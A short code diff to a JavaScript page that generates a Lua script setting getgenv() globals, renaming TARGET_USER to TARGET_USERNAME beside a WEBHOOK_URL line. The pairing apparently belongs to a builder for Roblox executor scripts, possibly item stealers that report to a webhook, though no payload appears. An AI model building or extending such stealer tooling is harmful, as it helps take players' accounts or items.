@@ -543,7 +543,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
         }
 
-        let script = `getgenv().TARGET_USER = "${username.replace(/"/g, '\\"')}"\n`;
+        let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
         script += `getgenv().WEBHOOK_URL = "${webhook.replace(/"/g, '\\"')}"\n`;
 
         const modePrefix = mode === 'NORMAL' ? 'NORMAL' : 'CUSTOM';
